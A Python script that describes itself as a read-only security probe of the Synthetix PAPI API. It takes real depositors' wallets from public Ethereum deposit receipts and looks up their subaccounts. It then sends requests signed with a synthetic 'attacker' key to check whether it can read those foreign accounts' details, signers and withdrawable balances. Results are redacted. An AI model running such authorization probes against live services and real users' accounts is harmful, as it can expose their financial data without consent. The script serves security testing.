#!/usr/bin/env python3
"""Redacted, read-only Synthetix PAPI authorization probe.

Safety properties:
- derives candidate accounts only from public deposit transaction receipts;
- uses a deterministic synthetic attacker key with no funds;
- sends only account-query actions to the PAPI trade endpoint;
- never stores raw wallet addresses, account IDs, balances, positions or orders;
- records only hashes, status/error codes, schemas and counts;
- always emits a redacted summary, including on failure.
"""

from __future__ import annotations

import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_utils import to_checksum_address

OUT = pathlib.Path("read_auth_boundary")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
    "https://rpc.mevblocker.io",
    "https://eth.drpc.org",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
PAPI_TRADE = "https://papi.synthetix.io/v1/trade"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"

# Recent public transactions labelled Deposit on the in-scope proxy's Etherscan page.
DEPOSIT_TX_HASHES = (
    "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
    "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
    "0xff49e1668459cf9d6740fa406bb6e1714495451614bf7a0cbba287fd012d0406",
    "0x2bcf6ce3cd19759da83c531db0c37756af79371e4acd0c5e94e870c0485cd0dc",
    "0x37e4ed3427007aa6c4f2d3297fd12b42b854ae55fae5b1203fac5406d9b170ec",
    "0x3768526db1bd1a128785882ad010ba415508d51ff11b603872fc7d45789ccfc8",
    "0x0c9bf25d6b94eec665034bccfe2e72132084f6e540eae6bdfd3f6f4db25d3f30",
)

ATTACKER_PRIVATE_KEY = "0x" + "33" * 32
ATTACKER = Account.from_key(ATTACKER_PRIVATE_KEY)
MAX_HTTP_BODY = 2 * 1024 * 1024
UA = "Mozilla/5.0 (compatible; authorized-read-only-security-review/1.0)"

DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
TYPES = {
    "EIP712Domain": [
        {"name": "name", "type": "string"},
        {"name": "version", "type": "string"},
        {"name": "chainId", "type": "uint256"},
        {"name": "verifyingContract", "type": "address"},
    ],
    "SubAccountAction": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "action", "type": "string"},
        {"name": "expiresAfter", "type": "uint256"},
    ],
}

DIAG: dict[str, Any] = {
    "stage": "initializing",
    "rpc_calls": 0,
    "receipts_checked": 0,
    "deposit_events_found": 0,
    "papi_info_requests": [],
}


def digest(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = re.sub(r"0x[a-fA-F0-9]{40}", "<address>", text)
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{6,}\b", "<number>", text)
    return text[:300]


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes]:
    req = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read(MAX_HTTP_BODY + 1)
            if len(body) > MAX_HTTP_BODY:
                raise ValueError("response too large")
            return response.status, body
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(MAX_HTTP_BODY + 1)


def rpc(method: str, params: list[Any]) -> Any:
    DIAG["rpc_calls"] += 1
    errors: list[str] = []
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    for url in RPC_URLS:
        try:
            status, body = post_json(url, payload)
            data = json.loads(body)
            if status >= 400 or "error" in data:
                code = data.get("error", {}).get("code") if isinstance(data.get("error"), dict) else None
                errors.append(f"status={status},code={code}")
                continue
            return data["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def parse_json(body: bytes) -> Any:
    try:
        return json.loads(body)
    except Exception:
        return None


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 3:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(val, depth + 1) for key, val in sorted(value.items())}
    if isinstance(value, list):
        return {
            "type": "list",
            "count": len(value),
            "sample_schema": schema(value[0], depth + 1) if value else None,
        }
    return type(value).__name__


def topic_address(topic: str) -> str:
    return to_checksum_address("0x" + topic[-40:])


def event_from_receipt(tx_hash: str) -> dict[str, Any] | None:
    DIAG["receipts_checked"] += 1
    receipt = rpc("eth_getTransactionReceipt", [tx_hash])
    if not isinstance(receipt, dict):
        return None
    for log in receipt.get("logs", []):
        topics = log.get("topics", [])
        if (
            str(log.get("address", "")).lower() == DEPOSIT_PROXY.lower()
            and len(topics) >= 4
            and str(topics[0]).lower() == ASSET_DEPOSITED_TOPIC.lower()
        ):
            body = str(log.get("data", ""))[2:]
            if len(body) < 128:
                continue
            DIAG["deposit_events_found"] += 1
            return {
                "tx_hash": tx_hash,
                "depositor": topic_address(topics[1]),
                "beneficiary": topic_address(topics[2]),
                "amount": int(body[:64], 16),
                "event_subaccount_id": str(int(body[64:128], 16)),
            }
    return None


def account_ids(wallet: str) -> dict[str, list[str]]:
    status, body = post_json(
        PAPI_INFO,
        {
            "params": {
                "action": "getSubAccountIds",
                "walletAddress": wallet,
                "includeDelegations": True,
            }
        },
    )
    data = parse_json(body)
    response = data.get("response") if isinstance(data, dict) else None
    error = data.get("error") if isinstance(data, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    result = {"owned": [], "delegated": [], "managed": []}
    if status == 200 and isinstance(data, dict) and data.get("status") == "ok":
        if isinstance(response, list):
            result["owned"] = [str(v) for v in response]
        elif isinstance(response, dict):
            result["owned"] = [str(v) for v in response.get("subAccountIds", []) or []]
            result["delegated"] = [str(v) for v in response.get("delegatedSubAccountIds", []) or []]
            result["managed"] = [str(v) for v in response.get("managedSubAccountIds", []) or []]
    DIAG["papi_info_requests"].append(
        {
            "http_status": status,
            "api_status": data.get("status") if isinstance(data, dict) else None,
            "error_code": error_code,
            "error_message_redacted": redact(error_message),
            "response_schema": schema(response),
            "owned_count": len(result["owned"]),
            "delegated_count": len(result["delegated"]),
            "managed_count": len(result["managed"]),
            "body_sha256": hashlib.sha256(body).hexdigest(),
        }
    )
    return result


def discover_target() -> tuple[dict[str, Any], list[dict[str, Any]]]:
    DIAG["stage"] = "checking_public_deposit_receipts"
    consistency: list[dict[str, Any]] = []
    selected: dict[str, Any] | None = None
    for tx_hash in DEPOSIT_TX_HASHES:
        event = event_from_receipt(tx_hash)
        if not event:
            continue
        beneficiary_ids = account_ids(event["beneficiary"])
        row = {
            "tx_hash_sha256": digest(tx_hash),
            "depositor_equals_beneficiary": event["depositor"].lower() == event["beneficiary"].lower(),
            "event_subaccount_is_master_routing_sentinel": event["event_subaccount_id"] == "0",
            "event_subaccount_in_beneficiary_owned": event["event_subaccount_id"] in beneficiary_ids["owned"],
            "beneficiary_owned_count": len(beneficiary_ids["owned"]),
            "beneficiary_delegated_count": len(beneficiary_ids["delegated"]),
            "beneficiary_managed_count": len(beneficiary_ids["managed"]),
            "amount_nonzero": event["amount"] > 0,
        }
        consistency.append(row)
        if selected is None and beneficiary_ids["owned"]:
            selected = {
                **event,
                "target_subaccount_id": beneficiary_ids["owned"][0],
            }
        time.sleep(0.35)
    if selected is None:
        raise RuntimeError("No deposit beneficiary had a public owned subaccount ID")
    return selected, consistency


def sign_action(subaccount_id: str, action: str, expires_after: int) -> dict[str, Any]:
    encoded = encode_typed_data(
        full_message={
            "types": TYPES,
            "primaryType": "SubAccountAction",
            "domain": DOMAIN,
            "message": {
                "subAccountId": int(subaccount_id),
                "action": action,
                "expiresAfter": expires_after,
            },
        }
    )
    signed = ATTACKER.sign_message(encoded)
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def summarize(name: str, status: int, body: bytes) -> dict[str, Any]:
    data = parse_json(body)
    success = bool(status == 200 and isinstance(data, dict) and data.get("status") == "ok")
    error = data.get("error") if isinstance(data, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    return {
        "name": name,
        "http_status": status,
        "api_success": success,
        "error_code": error_code,
        "error_message_redacted": redact(error_message),
        "error_message_sha256": digest(str(error_message)) if error_message is not None else None,
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "body_bytes": len(body),
        "response_schema": schema(data.get("response")) if success and isinstance(data, dict) else None,
    }


def trade_read(name: str, subaccount_id: str, action: str, extra: dict[str, Any] | None = None) -> dict[str, Any]:
    expires_after = int(time.time() * 1000) + 120_000
    params: dict[str, Any] = {
        "action": action,
        "subAccountId": subaccount_id,
        "walletAddress": ATTACKER.address,
    }
    if extra:
        params.update(extra)
    status, body = post_json(
        PAPI_TRADE,
        {
            "params": params,
            "signature": sign_action(subaccount_id, action, expires_after),
            "expiresAfter": expires_after,
        },
    )
    return summarize(name, status, body)


def run_probe() -> dict[str, Any]:
    event, consistency = discover_target()
    target_id = event["target_subaccount_id"]
    DIAG["stage"] = "testing_foreign_read_authorization"
    results: list[dict[str, Any]] = []

    status, body = post_json(
        PAPI_TRADE,
        {
            "params": {
                "action": "getSubAccount",
                "subAccountId": target_id,
                "walletAddress": ATTACKER.address,
            }
        },
    )
    results.append(summarize("missing_signature_control", status, body))
    time.sleep(0.7)

    tests = (
        ("foreign_get_subaccount", "getSubAccount", None),
        ("foreign_get_delegated_signers", "getDelegatedSigners", None),
        ("foreign_get_withdrawable_amounts", "getWithdrawableAmounts", {"symbols": ["USDT", "WETH"]}),
        (
            "foreign_get_delegations_for_delegate",
            "getDelegationsForDelegate",
            {"owningAddress": event["beneficiary"]},
        ),
    )
    for name, action, extra in tests:
        results.append(trade_read(name, target_id, action, extra))
        time.sleep(0.7)

    DIAG["stage"] = "completed"
    return {
        "safety": "Read-only actions only; no raw wallet, account ID, balance, position or order data retained.",
        "attacker_address": ATTACKER.address,
        "selected_beneficiary_sha256": digest(event["beneficiary"].lower()),
        "selected_subaccount_id_sha256": digest(target_id),
        "deposit_identity_consistency": consistency,
        "tests": results,
        "unexpected_authorization_success": any(
            item["api_success"] for item in results if item["name"].startswith("foreign_")
        ),
        "diagnostics": DIAG,
    }


def main() -> None:
    try:
        summary = run_probe()
    except BaseException as exc:  # noqa: BLE001
        summary = {
            "safety": "No state-changing request was issued; no raw wallet or account data retained.",
            "unexpected_authorization_success": False,
            "probe_completed": False,
            "failure_type": type(exc).__name__,
            "failure_message_redacted": redact(exc),
            "failure_message_sha256": digest(str(exc)),
            "diagnostics": DIAG,
        }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
